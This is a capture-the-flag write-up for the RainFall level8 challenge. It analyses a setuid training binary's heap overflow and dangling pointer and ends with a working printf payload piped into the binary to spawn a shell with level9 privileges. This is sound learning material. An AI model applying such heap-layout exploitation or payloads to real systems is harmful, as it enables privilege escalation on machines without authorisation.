# RainFall (level8)

In this project, we try to **exploit binaries**.
By doing so, we wish to read the `/home/user/level9/.pass` file, containing our flag serving as the password for the next level.

## Binary decompilation.

It is a **ELF 32-bit x86 LSB** executable as stated by the command `file -b ~/level8` commands.

We use `objdump -d ~/level8` to disassemble the binary. We stored it's truncated result in the [source.asm](./source.asm) file.

We also decompile the binary using a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra). We performed analysis and manual refactoring to isolate the vulnerability and make the relevant C code more readable. The result is saved in the [source.c](./source.c) file and generated through the [decompile.sh](./Ressources/decompile.sh) shell script.

## Binary particularities

By connecting via ssh (cf. [ssh.sh](./Ressources/ssh.sh)), we made some observations.

On login or by executing `checksec --kernel && checksec --file ~/level8`, we discover:
```sh
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8

```

The binary is owned by `level9` and has the `setuid` flag set.
```sh
$ ls -la ~/level8 
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 /home/user/level8/level8
```

Useful documentation:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASRL): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to a "Heap-based Buffer Overflow" ([CWE-112](https://cwe.mitre.org/data/definitions/122.html)) via adjacent heap chunk overwrite or also present a "Use After Free" ([CWE-416](https://cwe.mitre.org/data/definitions/416.html)) opportunity.

## Vulnerability analysis

The program offers four commands, provided via stdin, reading at most 127 characters per input:
- `"auth "`: Allocates 4 bytes on the heap and writes up to 30 bytes into it, which enables a ***heap-based buffer overflow into adjacent memory***.
- `"reset"`: Frees the pointer held by `auth` if it is not NULL, but leaves the ***pointer dangling*** without clearing its address.
- `"servic"`: Allocates memory on the heap for the string argument using `strdup()` and stores the resulting pointer in `service`.
- `"login"`: Reads the integer located at an offset of 32 bytes from the address held by `auth`. If it is `!= 0`, it opens up a shell.

### Heap

`"auth "` triggers a 'c/malloc(4)` allocation.  
Due to alignment rules and internal chunk metadata, it creates a ***small memory chunk*** taking a total of **16 bytes** on the target system.  
Subsequent `c/malloc()` calls for ***small memory allocations** would typically be placed directly adjacent to it in memory, contiguously.

Assuming `"auth "` is executed first, followed by `"servic"` with a payload of ***16 bytes of padding*** and a ***4-byte little-endian integer*** of value ***1***, the resulting heap layout would appear as follows:
```ruby
      LOWER MEMORY ADDRESSES      
+------ Chunk nº1: metadata -----+
|                                | (8 bytes)
+------ Chunk nº1: userdata -----+ <-- (@ 0x0804a008) PTR held in **data segment** (`auth`)
| | str             | (4 bytes)  |
| +-----------------+            | (8 bytes)
| |alignment/unused | (4 bytes)  |
+------ Chunk nº2: metadata -----+
|                                | (8 bytes)
+------ Chunk nº2: userdata -----+ <-- (@ 0x0804a018) PTR held in **data segment** (`service`)
| |                 |            |
| |     padding     | (16 bytes) |
| |                 |            |
| +-----------------+            | (20-n bytes)
| |    integer: 1   | (4 bytes)  |
| +-----------------+            |
+--------------------------------+
      HIGHER MEMORY ADDRESSES     
```

As payloads taken via `stdin` are limited to [0;127] bytes by `fgets()`, the memory regions allocated through the command `"servic "` via `strdup()` would always be categorized as **small**. Thus any payload passed via the `"servic "` command would end up contiguous with the region allocated via `"auth "`.
```sh
$ (printf "auth \nservic %119c\n" "c") | ./level8 
# [...]
0x804a008, 0x804a018 
```

### Intent

We want to exploit the `"login"` command, which makes an ***out-of-bounds privilege check*** with an offset of 32 bytes after the `auth` pointer, by placing a controlled non-zero value at that location using adjacent heap allocation.

## Exploit

When we chain `"auth "` and `"servic "`, the program displays the allocated memory addresses for us. This allows us to quickly calculate the offset between the two: `0x0804a018` - `0x0804a008` = 16 bytes.
```sh
$ (printf "auth \nservic \n") | ./level8
# [...]
0x804a008, 0x804a018 
# $auth = 0x0804a008
# $service = 0x0804a018 
# 0x0804a018 - 0x0804a008 = 16
```
Here the commands (thus implicitly the allocation order) matters as we can only write from lower memory addresses to higher ones.

To set the value ***1*** 32 bytes after `auth` (we intend to keep at `0x804a008`), considering the 16 bytes offset between `auth` and `service`, we will only need ***16 bytes of padding***.
```sh
$ (printf "auth \nservic %16c%b\nlogin\n" "c" "\001\000\000\000"; cat -) | ./level8
```
